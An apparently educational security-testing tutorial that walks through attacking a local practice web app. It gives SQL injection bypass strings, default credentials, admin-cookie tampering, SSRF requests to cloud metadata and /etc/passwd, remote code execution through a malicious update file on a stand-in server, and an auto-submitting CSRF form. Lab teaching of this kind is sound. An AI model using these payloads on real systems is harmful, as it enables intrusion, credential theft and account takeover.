# Web Application Security Testing Tutorial

⚠️ **For Educational Purposes Only** ⚠️

This guide will walk you through the process of testing various security vulnerabilities in a web application. We'll go step by step, explaining what each vulnerability is, how to find it, and how to exploit it.

## Step 1: Initial Reconnaissance

Before we start exploiting vulnerabilities, we need to understand what we're working with. Let's discover what endpoints are available.

### 1.1 Discovering Endpoints

There are three main ways to discover endpoints. Let's try each one:

1. First, visit `/robots.txt`:

   ```
   GET http://localhost:5001/robots.txt
   ```

   This file is meant to tell search engines what not to index, but it often reveals sensitive endpoints. Look at the "Disallow" entries - these are the paths the application doesn't want to be public, which makes them interesting for us!

2. Next, check `/sitemap.xml`:

   ```
   GET http://localhost:5001/sitemap.xml
   ```

   The sitemap shows all public endpoints. Compare these with the robots.txt entries - any differences?

3. Finally, the application has a debug endpoint that lists ALL routes:
   ```
   GET http://localhost:5001/endpoints
   ```
   This gives us the most complete picture, including HTTP methods and parameters.

Take notes of interesting endpoints, especially:

- Admin endpoints (`/admin/...`)
- API endpoints
- Debug endpoints
- Backup/system endpoints

## Step 2: Testing Authentication

Now that we know what endpoints exist, let's try to bypass authentication.

### 2.1 Default Credentials

1. First, try these common credentials:

   ```
   admin:admin123
   admin:password
   admin:admin
   root:root
   test:test
   ```

2. We got lucky! `admin:admin123` works. Always check for default credentials first - it's surprising how often they work.

### 2.2 SQL Injection in Login

The login form is vulnerable to SQL injection. Let's try simple payloads:

1. Basic Authentication Bypass:

   ```
   Username: ' or 1=1 --
   Password: anything
   ```

2. Login as Admin:

   ```
   Username: admin
   Password: ' or '1'='1
   ```

3. Another Admin Bypass:

   ```
   Username: admin
   Password: ' or 1=1 --
   ```

4. Using OR with Both Fields:
   ```
   Username: ' or 1=1 or '
   Password: ' or 1=1 or '
   ```

### Tips for SQL Injection:

1. Keep it extremely simple - avoid complex SQL
2. Try injecting in either username or password field
3. Use single quotes (') to break out of strings
4. Use -- to comment out the rest (with a space after --)
5. Avoid using special SQL keywords like UNION or SELECT

### 3.1 Search Function SQL Injection

The search function is simpler to exploit:

1. Basic Injection:

   ```
   ' or '1'='1
   ```

2. Show All Users:

   ```
   ' or 1=1 --
   ```

3. Always True Condition:
   ```
   anything' or 'x'='x
   ```

## Step 4: Session Attacks

The application has several session-related vulnerabilities.

### 4.1 Cookie Manipulation

1. Login as a normal user and check your cookies. You'll see:

   ```
   is_admin=false
   current_user=your_username
   ```

2. Using your browser's developer tools, change these to:

   ```
   is_admin=true
   current_user=admin
   ```

3. Refresh the page - you now have admin access!

### 4.2 Session Fixation

1. Get a session ID before logging in:

   ```
   GET /fixation-login
   ```

   Note your session cookie.

2. Login through `/fixation-login`
   The session ID stays the same - this is the vulnerability!

## Step 5: Server-Side Request Forgery (SSRF)

The application has two SSRF vulnerabilities. Let's test them:

### 5.1 Basic SSRF

1. Try the website checker:

   ```
   GET /check-website?url=http://localhost:22
   ```

   This scans for SSH!

2. Try accessing AWS metadata:

   ```
   GET /check-website?url=http://169.254.169.254/latest/meta-data
   ```

   This could expose cloud credentials!

3. Read local files:
   ```
   GET /check-website?url=file:///etc/passwd
   ```

### 5.2 Avatar SSRF

The avatar fetcher has similar vulnerabilities:

```
GET /fetch-avatar?url=file:///etc/passwd
GET /fetch-avatar?url=http://localhost:22
```

## Step 6: Remote Code Execution

The update mechanism is vulnerable to RCE:

1. Create a malicious JSON file:

   ```json
   {
     "version": "2.0",
     "commands": ["id", "whoami", "cat /etc/passwd"]
   }
   ```

2. Host it somewhere (or use a request bin service)

3. Submit the update:

   ```
   POST /apply-update
   Content-Type: application/x-www-form-urlencoded

   update_url=http://your-server/malicious.json
   ```

## Step 7: Cross-Site Request Forgery (CSRF)

The password reset functionality has no CSRF protection:

1. Create `csrf.html`:

   ```html
   <form
     id="csrf"
     action="http://localhost:5001/admin/reset-password"
     method="POST"
   >
     <input type="hidden" name="username" value="admin" />
     <input type="hidden" name="password" value="hacked" />
   </form>
   <script>
     document.getElementById("csrf").submit();
   </script>
   ```
